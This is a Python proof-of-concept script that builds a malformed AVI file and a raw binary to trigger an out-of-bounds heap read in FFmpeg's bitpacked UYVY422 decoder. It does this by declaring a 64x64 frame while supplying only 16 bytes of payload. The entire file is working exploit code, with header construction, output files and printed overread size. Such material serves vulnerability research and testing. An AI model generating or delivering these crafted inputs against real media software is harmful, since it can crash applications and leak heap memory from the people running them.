#!/usr/bin/env python3
"""
PoC generator for VULN 001: Missing packet size check before av_image_fill_arrays
in bitpacked_decode_uyvy422 (CWE-125, Out-of-bounds Read).

Generates a crafted AVI file with:
- UYVY codec tag, biBitCount=16 (-> AV_PIX_FMT_UYVY422, bits_per_coded_sample=16)
- Width=64, Height=64 (requires 64*64*2 = 8192 bytes per frame)
- Actual frame payload: only 16 bytes (far less than required)

The decoder sets frame->data[0] = avpkt->data (passthrough, no copy) without
checking avpkt->size vs. the required image size. Any downstream consumer that
reads frame->data[0] beyond avpkt->size will perform an OOB heap read.
"""

import struct
import sys

WIDTH  = 64
HEIGHT = 64
REQUIRED_BYTES = WIDTH * HEIGHT * 2  # 8192 for UYVY422

# Deliberately tiny frame payload - triggers OOB read
FRAME_DATA = b'\xAB\xCD' * 8  # 16 bytes instead of 8192

FOURCC_UYVY = b'UYVY'  # codec tag that triggers bitpacked_decode_uyvy422


def chunk(tag: bytes, data: bytes) -> bytes:
    """Build a RIFF chunk: tag(4) + size(4,LE) + data (padded to even)."""
    assert len(tag) == 4
    pad = b'\x00' if len(data) % 2 else b''
    return tag + struct.pack('<I', len(data)) + data + pad


def list_chunk(list_type: bytes, data: bytes) -> bytes:
    """Build a RIFF LIST chunk: 'LIST' + size(4,LE) + type(4) + data."""
    assert len(list_type) == 4
    inner = list_type + data
    pad = b'\x00' if len(inner) % 2 else b''
    return b'LIST' + struct.pack('<I', len(inner) + len(pad)) + inner + pad


def build_avih() -> bytes:
    """
    AVIMAINHEADER - exactly 56 bytes.
    typedef struct {
      DWORD dwMicroSecPerFrame;      // 4
      DWORD dwMaxBytesPerSec;        // 4
      DWORD dwPaddingGranularity;    // 4
      DWORD dwFlags;                 // 4
      DWORD dwTotalFrames;           // 4
      DWORD dwInitialFrames;         // 4
      DWORD dwStreams;               // 4
      DWORD dwSuggestedBufferSize;   // 4
      DWORD dwWidth;                 // 4
      DWORD dwHeight;                // 4
      DWORD dwReserved[4];           // 16
    } AVIMAINHEADER;  // total = 56
    Format: 14 DWORDs = '<' + 'I'*14
    """
    fmt = '<' + 'I' * 14
    assert struct.calcsize(fmt) == 56, struct.calcsize(fmt)
    return struct.pack(fmt,
        33333,            # dwMicroSecPerFrame (~30 fps)
        REQUIRED_BYTES * 30,  # dwMaxBytesPerSec
        0,                # dwPaddingGranularity
        0x0010,           # dwFlags (AVIF_HASINDEX)
        1,                # dwTotalFrames
        0,                # dwInitialFrames
        1,                # dwStreams
        REQUIRED_BYTES,   # dwSuggestedBufferSize
        WIDTH,            # dwWidth
        HEIGHT,           # dwHeight
        0, 0, 0, 0,       # dwReserved[4]
    )


def build_strh() -> bytes:
    """
    AVISTREAMHEADER for video - exactly 56 bytes.
    typedef struct {
      FOURCC fccType;                // 4
      FOURCC fccHandler;             // 4
      DWORD  dwFlags;                // 4
      WORD   wPriority;              // 2
      WORD   wLanguage;              // 2
      DWORD  dwInitialFrames;        // 4
      DWORD  dwScale;                // 4
      DWORD  dwRate;                 // 4
      DWORD  dwStart;                // 4
      DWORD  dwLength;               // 4
      DWORD  dwSuggestedBufferSize;  // 4
      LONG   dwQuality;              // 4  (signed)
      DWORD  dwSampleSize;           // 4
      RECT   rcFrame;                // 8  (4 x SHORT)
    } AVISTREAMHEADER;  // total = 4+4+4+2+2+(6*4)+4+4+8 = 56
    """
    # First part: 4s 4s I H H (I*6) i I = 4+4+4+2+2+24+4+4 = 48 bytes
    fmt1 = '<4s4sIHHIIIIIIiI'
    assert struct.calcsize(fmt1) == 48, struct.calcsize(fmt1)
    part1 = struct.pack(fmt1,
        b'vids',         # fccType
        FOURCC_UYVY,     # fccHandler
        0,               # dwFlags
        0,               # wPriority
        0,               # wLanguage
        0,               # dwInitialFrames
        1,               # dwScale
        30,              # dwRate (30fps)
        0,               # dwStart
        1,               # dwLength (1 frame)
        REQUIRED_BYTES,  # dwSuggestedBufferSize
        -1,              # dwQuality (signed, -1 = default)
        0,               # dwSampleSize
    )
    # rcFrame: left top right bottom (4 x SHORT = 8 bytes)
    fmt2 = '<hhhh'
    assert struct.calcsize(fmt2) == 8
    part2 = struct.pack(fmt2, 0, 0, WIDTH, HEIGHT)
    result = part1 + part2
    assert len(result) == 56, len(result)
    return result


def build_strf() -> bytes:
    """
    BITMAPINFOHEADER - exactly 40 bytes.
    biBitCount=16 causes FFmpeg to set bits_per_coded_sample=16 and
    pix_fmt=AV_PIX_FMT_UYVY422, selecting bitpacked_decode_uyvy422.
    biCompression='UYVY' sets codec_tag=MKTAG('U','Y','V','Y').
    """
    fmt = '<IiiHH4sIiiII'
    assert struct.calcsize(fmt) == 40, struct.calcsize(fmt)
    return struct.pack(fmt,
        40,              # biSize
        WIDTH,           # biWidth
        HEIGHT,          # biHeight (positive = bottom-up)
        1,               # biPlanes
        16,              # biBitCount  <-- critical: selects UYVY422 path
        FOURCC_UYVY,     # biCompression = 'UYVY'
        REQUIRED_BYTES,  # biSizeImage (what header claims)
        0,               # biXPelsPerMeter
        0,               # biYPelsPerMeter
        0,               # biClrUsed
        0,               # biClrImportant
    )


def build_avi() -> bytes:
    strf_data = build_strf()
    strh_data = build_strh()
    strl = list_chunk(b'strl',
        chunk(b'strh', strh_data) +
        chunk(b'strf', strf_data)
    )
    avih_data = build_avih()
    hdrl = list_chunk(b'hdrl', chunk(b'avih', avih_data) + strl)

    # Video frame chunk - deliberately undersized (triggers OOB read)
    frame_chunk = chunk(b'00dc', FRAME_DATA)

    # idx1 chunk (AVI index) pointing to the frame
    # Offset is relative to start of 'movi' data (past 'movi' tag = 4 bytes)
    idx1_entry = struct.pack('<4sIII',
        b'00dc',
        0x10,            # AVIIF_KEYFRAME
        4,               # offset from start of movi data
        len(FRAME_DATA),
    )
    idx1_chunk = chunk(b'idx1', idx1_entry)

    movi = list_chunk(b'movi', frame_chunk)

    riff_data = b'AVI ' + hdrl + movi + idx1_chunk
    avi = b'RIFF' + struct.pack('<I', len(riff_data)) + riff_data
    return avi


def main():
    # Write AVI file (UYVY → AV_CODEC_ID_RAWVIDEO via riff.c tag table;
    # use -vcodec bitpacked to force the vulnerable decoder)
    outfile = 'vuln_001_input.avi'
    data = build_avi()
    with open(outfile, 'wb') as f:
        f.write(data)
    print(f"[+] Written {outfile} ({len(data)} bytes)")

    # Write a tiny raw binary file for use with the bitpacked demuxer
    # (-f bitpacked -pixel_format uyvy422 -video_size 64x64 -vcodec bitpacked)
    rawfile = 'vuln_001_tiny.bin'
    with open(rawfile, 'wb') as f:
        f.write(FRAME_DATA)
    print(f"[+] Written {rawfile} ({len(FRAME_DATA)} bytes)")

    print(f"[+] Frame dimensions: {WIDTH}x{HEIGHT}, required bytes: {REQUIRED_BYTES}")
    print(f"[+] Actual frame payload: {len(FRAME_DATA)} bytes")
    print(f"[+] OOB delta: {REQUIRED_BYTES - len(FRAME_DATA)} bytes beyond packet buffer")


if __name__ == '__main__':
    main()
